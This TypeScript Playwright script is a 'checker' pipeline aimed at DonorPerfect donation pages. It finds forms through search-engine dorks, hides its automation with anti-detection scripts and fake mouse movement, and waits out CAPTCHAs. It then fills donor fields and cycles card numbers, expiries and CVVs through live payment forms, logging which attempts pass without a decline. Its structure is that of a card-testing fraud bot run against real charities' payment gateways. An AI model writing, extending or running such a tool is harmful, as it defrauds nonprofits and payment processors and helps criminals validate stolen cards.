import { chromium, Browser, BrowserContext, Page } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';

// @ts-ignore
const __filename_resolved = typeof __filename !== 'undefined' ? __filename : fileURLToPath(import.meta.url);
// @ts-ignore
const __dirname_resolved = typeof __dirname !== 'undefined' ? __dirname : path.dirname(__filename_resolved);

const ROOT_DIR = path.resolve(__dirname_resolved, '../../../');
const DATA_DIR = path.join(ROOT_DIR, 'data');
const LOG_FILE = path.join(DATA_DIR, 'gateway2_crawl_log.txt');
const TARGET_URLS_FILE = path.join(DATA_DIR, 'found_urls.txt');

// Ensure data directory exists
export function ensureDataDir() {
    if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
    }
}

if (typeof process !== 'undefined' && process.argv[1] === __filename_resolved) {
    ensureDataDir();
}

// ==========================================
// TYPES & INTERFACES
// ==========================================
export interface Config {
    mode: 'discovery' | 'checker';
    engines: Record<string, string>;
    searchQueries: string[];
    minDelay: number;
    maxDelay: number;
    targetUrls: string[];
    maxFormsToProcess: number;
    userData: Record<string, string>;
    paymentData: { cc: string; exp: string; cvv: string }[];
    selectors: {
        mainFormWrapper: string;
        errorDiv: string;
        errorText: string;
        ccSection: string;
        submitBtn: string;
    };
    maxPaymentRetries: number;
    cardsPerUrl: number;
    outputCsv: string;
    userAgent: string;
}

// ==========================================
// CONFIGURATION
// ==========================================
export const CONFIG: Config = {
    mode: 'discovery', // 'discovery' or 'checker' - defaults to discovery for server spawn
    engines: {
        google: "https://www.google.com/search?q={query}&num=20",
        bing: "https://www.bing.com/search?q={query}&count=20"
    },
    searchQueries: [
        "site:wl.donorperfect.net inurl:weblink.aspx",
        "site:wl.donorperfect.net inurl:FormSingleNM.aspx",
        "\"powered by donorperfect\" donation"
    ],
    minDelay: 15.0,
    maxDelay: 30.0,
    targetUrls: [],
    maxFormsToProcess: 10,
    userData: {
        first_name: "Jane", last_name: "Smith", email: "automation@test.com",
        phone: "5559876543", address: "456 Auto Blvd", city: "Robotown",
        state: "CA", zip: "90210", country: "US"
    },
    paymentData: [
        { cc: "4000056655665556", exp: "11/28", cvv: "999" },
        { cc: "4000056655665556", exp: "11/29", cvv: "888" },
        { cc: "4000056655665556", exp: "12/28", cvv: "111" },
        { cc: "4000056655665556", exp: "01/28", cvv: "222" },
        { cc: "4000056655665556", exp: "02/28", cvv: "333" }
    ],
    selectors: {
        mainFormWrapper: "#divForm",
        errorDiv: "#\\32 ",
        errorText: "Sorry, there was an error processing the donation",
        ccSection: "#section_cc",
        submitBtn: "#btnSubmit, #btnSubmitBottom, input[type='submit'], button[type='submit']"
    },
    maxPaymentRetries: 5,
    cardsPerUrl: 5,
    outputCsv: "dp_master_results.csv",
    userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
};

// ==========================================
// UTILITY FUNCTIONS
// ==========================================
const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
const randomFloat = (min: number, max: number) => Math.random() * (max - min) + min;

function log(level: "INFO" | "WARN" | "ERROR" | "CRITICAL", msg: string) {
    const timestamp = new Date().toISOString();
    const formatted = `[${timestamp}] [${level}] ${msg}`;
    console.log(formatted);
    try {
        fs.appendFileSync(LOG_FILE, formatted + "\n");
    } catch (e) {
        console.error(`Failed to write to log file: ${e}`);
    }
}

async function appendCsv(filepath: string, row: string[]) {
    const line = row.join(',') + '\n';
    fs.appendFileSync(filepath, line, 'utf8');
}

// ==========================================
// STEALTH & HUMAN SIMULATION
// ==========================================
async function injectStealthScripts(page: Page) {
    log("INFO", "Injecting anti-detection stealth scripts...");
    await page.addInitScript(`
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        window.chrome = { runtime: {} };
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ? Promise.resolve({ state: Notification.permission }) : originalQuery(parameters)
        );
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    `);
}

async function humanType(page: Page, selector: string, text: string) {
    await page.click(selector);
    await sleep(randomFloat(200, 500));
    for (const char of text) {
        await page.keyboard.type(char, { delay: randomInt(50, 150) });
    }
}

function randomInt(min: number, max: number) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function simulateHumanBehavior(page: Page) {
    const width = page.viewportSize()?.width || 1280;
    const height = page.viewportSize()?.height || 720;

    for (let i = 0; i < randomInt(2, 4); i++) {
        let startX = randomInt(100, width - 100);
        let startY = randomInt(100, height - 100);
        const endX = randomInt(100, width - 100);
        const endY = randomInt(100, height - 100);
        
        await page.mouse.move(startX, startY);
        const steps = randomInt(5, 15);
        for (let s = 1; s <= steps; s++) {
            startX += ((endX - startX) / steps) + randomInt(-20, 20);
            startY += ((endY - startY) / steps) + randomInt(-20, 20);
            await page.mouse.move(startX, startY);
            await sleep(randomFloat(10, 50));
        }
    }
    await page.mouse.wheel(0, randomInt(150, 400));
    await sleep(randomFloat(500, 1500));
}

async function checkForCaptcha(page: Page): Promise<boolean> {
    await sleep(2000);
    const bodyText = await page.locator("body").innerText().catch(() => "");
    
    if (bodyText.toLowerCase().includes("unusual traffic") || bodyText.toLowerCase().includes("our systems have detected")) {
        log("CRITICAL", "🚨 GOOGLE CAPTCHA/BLOCK DETECTED 🚨");
        log("CRITICAL", "Please solve the CAPTCHA manually. Waiting 120 seconds...");
        await sleep(120000);
        return true;
    }
    
    if ((await page.locator("iframe[title*='recaptcha']").count()) > 0) {
        log("CRITICAL", "🚨 RECAPTCHA IFRAME DETECTED 🚨. Waiting 120 seconds...");
        await sleep(120000);
        return true;
    }
    return false;
}

// ==========================================
// PHASE 1: SEARCH ENGINE CRAWLER
// ==========================================
export function cleanGoogleRedirect(href: string | null): string | null {
    if (!href) return null;
    if (href.startsWith("/url?q=")) {
        const match = href.match(/\/url\?q=([^&]+)/);
        if (match) return decodeURIComponent(decodeURIComponent(match[1]));
    }
    if (!href.startsWith("http")) return null;
    const match = href.match(/\/url\?q=([^&]+)/);
    if (match) return decodeURIComponent(decodeURIComponent(match[1]));
    return href;
}

export function isValidDpUrl(url: string | null): boolean {
    return !!url && url.startsWith("http") && url.includes("wl.donorperfect.net");
}

export async function extractSearchResults(page: Page, engineName: string): Promise<string[]> {
    const urls = new Set<string>();
    try {
        if (engineName === "google") {
            const links = await page.locator("a:has(> h3)").all();
            for (const el of links) {
                const href = await el.getAttribute("href");
                const cleanUrl = cleanGoogleRedirect(href);
                if (isValidDpUrl(cleanUrl)) urls.add(cleanUrl!);
            }
        } else if (engineName === "bing") {
            const links = await page.locator("ol#b_results li.b_algo >> xpath=.//a").all();
            for (const el of links) {
                const href = await el.getAttribute("href");
                if (isValidDpUrl(href)) urls.add(href!);
            }
        }
    } catch (e) {
        log("ERROR", `Error parsing ${engineName}: ${e}`);
    }
    return Array.from(urls);
}

async function runCrawler(page: Page) {
    log("INFO", "=".repeat(50));
    log("INFO", "STARTING PHASE 1: STEALTH SEARCH ENGINE CRAWLER");
    log("INFO", "=".repeat(50));
    
    const foundLinks = new Set<string>();

    for (const [engineName, urlTemplate] of Object.entries(CONFIG.engines)) {
        for (const query of CONFIG.searchQueries) {
            log("INFO", `Searching ${engineName} for: ${query}`);

            if (engineName === "google") {
                log("INFO", "  -> Navigating to Google Homepage first...");
                await page.goto("https://www.google.com", { waitUntil: "networkidle" });
                await simulateHumanBehavior(page);
                await sleep(randomFloat(2000, 4000));
                
                await humanType(page, "textarea[name='q'], input[name='q']", query);
                await sleep(randomFloat(500, 1500));
                await page.keyboard.press("Enter");
            } else {
                await page.goto(urlTemplate.replace("{query}", encodeURIComponent(query)), { waitUntil: "domcontentloaded" });
            }

            try {
                await page.waitForSelector("h3", { timeout: 15000 });
            } catch {
                log("ERROR", "  -> Timed out waiting for search results.");
                continue;
            }

            if (await checkForCaptcha(page)) continue;

            try {
                await page.locator("button:has-text('Accept'), button:has-text('I agree')").first().click({ timeout: 3000 });
                await sleep(1000);
            } catch {}

            await simulateHumanBehavior(page);
            await sleep(randomFloat(2000, 5000));

            const results = await extractSearchResults(page, engineName);
            results.forEach(u => foundLinks.add(u));
            log("INFO", `  -> Found ${results.length} valid DP links on this page.`);

            const sleepTime = randomFloat(CONFIG.minDelay, CONFIG.maxDelay);
            log("INFO", `  -> Sleeping for ${sleepTime.toFixed(2)} seconds to mimic human reading...`);
            await sleep(sleepTime);
        }
    }

    CONFIG.targetUrls = Array.from(foundLinks);
    log("INFO", `[PHASE 1 COMPLETE] Found ${CONFIG.targetUrls.length} total targets to test.`);
}

// ==========================================
// PHASE 2: FORM AUTOMATION
// ==========================================
async function smartFill(page: Page, sectionSelector: string, fieldIdentifier: string, value: string): Promise<boolean> {
    const locators = [
        `${sectionSelector} input[id*='${fieldIdentifier}'][type='text']`,
        `${sectionSelector} input[id*='${fieldIdentifier}'][type='email']`,
        `${sectionSelector} input[id*='${fieldIdentifier}'][type='tel']`,
        `${sectionSelector} input[name*='${fieldIdentifier}']`,
        `${sectionSelector} select[id*='${fieldIdentifier}']`,
    ];

    for (const loc of locators) {
        try {
            const el = page.locator(loc).first();
            if (await el.isVisible({ timeout: 1500 })) {
                await el.click({ clickCount: 3 });
                await sleep(150);
                await el.fill(value);
                return true;
            }
        } catch {}
    }
    return false;
}

async function dynamicFieldFiller(page: Page) {
    log("INFO", "  -> Running Dynamic Field Filler...");
    const ud = CONFIG.userData;
    const fieldMap: Record<string, string[]> = {
        first_name: ["FirstName", "First", "fname"], last_name: ["LastName", "Last", "lname"],
        email: ["Email", "EmailAddress"], phone: ["Phone", "HomePhone", "Cell"],
        address: ["Address", "Street", "Address1"], city: ["City"],
        state: ["State"], zip: ["Zip", "Postal"], country: ["Country"]
    };

    let filled = 0;
    for (const [key, fragments] of Object.entries(fieldMap)) {
        for (const frag of fragments) {
            if (await smartFill(page, "#divForm", frag, ud[key])) {
                filled++;
                break;
            }
        }
    }
    log("INFO", `  -> Auto-filled ${filled} fields.`);
}

async function handlePaymentPage(page: Page, attemptNumber: number, cardIndex: number): Promise<string> {
    log("INFO", `  [PAYMENT] Attempt ${attemptNumber} for Card Index ${cardIndex}...`);
    await page.locator(CONFIG.selectors.submitBtn).first().click();
    await page.waitForLoadState("networkidle", { timeout: 15000 });
    
    try {
        await page.locator(CONFIG.selectors.errorDiv).waitFor({ state: "visible", timeout: 5000 });
        const errorText = await page.locator(CONFIG.selectors.errorDiv).innerText();
        
        if (errorText.includes(CONFIG.selectors.errorText)) {
            log("WARN", `  [PAYMENT] Card ${cardIndex} Failed. Cycling next...`);
            
            const nextCardIndex = (cardIndex + 1) % CONFIG.paymentData.length;
            const nextAttempt = attemptNumber + 1;
            
            if (nextAttempt >= CONFIG.cardsPerUrl) {
                log("INFO", `  [PAYMENT] Reached limit of ${CONFIG.cardsPerUrl} cards for this URL.`);
                return "FAILED_LIMIT";
            }
            
            const data = CONFIG.paymentData[nextCardIndex];
            await smartFill(page, CONFIG.selectors.ccSection, "CardNumber", data.cc);
            await smartFill(page, CONFIG.selectors.ccSection, "Expiration", data.exp);
            await smartFill(page, CONFIG.selectors.ccSection, "CVV", data.cvv);
            await sleep(1000);
            return handlePaymentPage(page, nextAttempt, nextCardIndex);
        }
        return "FAILED_UNKNOWN";
    } catch {
        log("INFO", "  [PAYMENT] Success! No error detected.");
        return "SUCCESS";
    }
}

async function processSingleUrl(page: Page, url: string, startCardIndex: number): Promise<{ status: string; nextCardIndex: number }> {
    log("INFO", `\n--- Processing Target: ${url} (Starting Card Index: ${startCardIndex}) ---`);
    await page.goto(url, { waitUntil: "domcontentloaded" });
    
    try {
        await page.waitForFunction(
            `document.querySelector('#divForm') && document.querySelector('#divForm').children.length > 0`,
            { timeout: 15000 }
        );
    } catch {
        return { status: "DEAD_LINK", nextCardIndex: startCardIndex };
    }

    await sleep(2000);
    const formHtml = await page.locator("#divForm").innerText();

    // SCENARIO A: Menu of links
    if (formHtml.includes("<a ") && !formHtml.includes("FormSingleNM") && !formHtml.includes("FormPayment") && !formHtml.includes("FormItemsTable")) {
        log("INFO", "  -> Detected Menu. Clicking first link...");
        const firstLink = page.locator("#divForm a[href*='weblink.aspx'], #divForm a[href*='Form']").first();
        if (await firstLink.isVisible()) {
            await firstLink.click();
            await page.waitForLoadState("domcontentloaded");
            await sleep(2000);
        }
    }

    let currentHtml = await page.locator("#divForm").innerText();

    // SCENARIO B: Data Entry Form
    if (currentHtml.includes("FormSingleNM") || currentHtml.includes("FormItemsTable")) {
        log("INFO", "  -> Detected Data Form.");
        await dynamicFieldFiller(page);
        
        if (currentHtml.includes("FormItemsTable")) {
            const qty = page.locator("#divForm input[type='text'][id*='Qty'], #divForm input[type='number']").first();
            if (await qty.isVisible()) await qty.fill("1");
            else await page.locator("#divForm input[type='radio']").first().check({ force: true });
        }

        log("INFO", "  -> Submitting Form...");
        await page.locator(CONFIG.selectors.submitBtn).first().click();
        
        try {
            await page.waitForSelector(CONFIG.selectors.ccSection, { timeout: 15000 });
            log("INFO", "  -> Payment Page Loaded.");
            
            const cardData = CONFIG.paymentData[startCardIndex];
            await smartFill(page, CONFIG.selectors.ccSection, "CardNumber", cardData.cc);
            await smartFill(page, CONFIG.selectors.ccSection, "Expiration", cardData.exp);
            await smartFill(page, CONFIG.selectors.ccSection, "CVV", cardData.cvv);
            
            const resultStatus = await handlePaymentPage(page, 0, startCardIndex);
            const nextIdx = (startCardIndex + CONFIG.cardsPerUrl) % CONFIG.paymentData.length;
            return { status: resultStatus, nextCardIndex: nextIdx };
        } catch {
            return { status: "NO_PAYMENT_PAGE", nextCardIndex: startCardIndex };
        }
    } 
    // SCENARIO C: Direct Payment
    else if (currentHtml.includes("FormPaymentNM")) {
        log("INFO", "  -> Detected Direct Payment Form.");
        await dynamicFieldFiller(page);
        
        const cardData = CONFIG.paymentData[startCardIndex];
        await smartFill(page, CONFIG.selectors.ccSection, "CardNumber", cardData.cc);
        await smartFill(page, CONFIG.selectors.ccSection, "Expiration", cardData.exp);
        await smartFill(page, CONFIG.selectors.ccSection, "CVV", cardData.cvv);
        
        const resultStatus = await handlePaymentPage(page, 0, startCardIndex);
        const nextIdx = (startCardIndex + CONFIG.cardsPerUrl) % CONFIG.paymentData.length;
        return { status: resultStatus, nextCardIndex: nextIdx };
    }

    return { status: "UNKNOWN_FORMAT", nextCardIndex: startCardIndex };
}

// ==========================================
// MAIN EXECUTION
// ==========================================
async function main() {
    log("INFO", `STARTING GATEWAY2 PIPELINE - MODE: ${CONFIG.mode.toUpperCase()}`);
    
    if (CONFIG.mode === 'discovery') {
        const browser = await chromium.launch({ headless: true });
        const context = await browser.newContext({ userAgent: CONFIG.userAgent });
        const page = await context.newPage();
        await injectStealthScripts(page);
        
        await runCrawler(page);
        
        if (CONFIG.targetUrls.length > 0) {
            fs.writeFileSync(TARGET_URLS_FILE, CONFIG.targetUrls.join('\n'), 'utf8');
            log("INFO", `Saved ${CONFIG.targetUrls.length} URLs to ${TARGET_URLS_FILE}`);
        } else {
            log("WARN", "No URLs found during discovery.");
        }
        
        await browser.close();
        return;
    }

    if (CONFIG.mode === 'checker') {
        if (!fs.existsSync(TARGET_URLS_FILE)) {
            log("ERROR", `Target URLs file not found: ${TARGET_URLS_FILE}. Run in discovery mode first.`);
            return;
        }

        const urls = fs.readFileSync(TARGET_URLS_FILE, 'utf8').split('\n').filter(u => u.trim());
        if (urls.length === 0) {
            log("ERROR", "No URLs in found_urls.txt to check.");
            return;
        }

        if (!fs.existsSync(CONFIG.outputCsv)) {
            fs.writeFileSync(CONFIG.outputCsv, "Timestamp,URL,Status\n", "utf8");
        }

        const browser = await chromium.launch({ headless: true });
        const context = await browser.newContext({
            userAgent: CONFIG.userAgent,
            viewport: { width: 1920, height: 1080 },
            locale: 'en-US',
            timezoneId: 'America/New_York'
        });
        
        const page = await context.newPage();
        await injectStealthScripts(page);

        let processed = 0;
        let cardCycleIndex = 0;

        for (const url of urls) {
            if (processed >= CONFIG.maxFormsToProcess) {
                log("INFO", `Hit max forms limit (${CONFIG.maxFormsToProcess}). Stopping.`);
                break;
            }
            
            const result = await processSingleUrl(page, url, cardCycleIndex);
            cardCycleIndex = result.nextCardIndex;
            
            const timestamp = new Date().toISOString();
            await appendCsv(CONFIG.outputCsv, [timestamp, url, result.status]);
            
            log("INFO", `-> Final Status: ${result.status}`);
            processed++;
            await sleep(randomFloat(3000, 7000));
        }

        log("INFO", "\n[DONE] Checker mode finished.");
        await browser.close();
    }
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
    main().catch(console.error);
}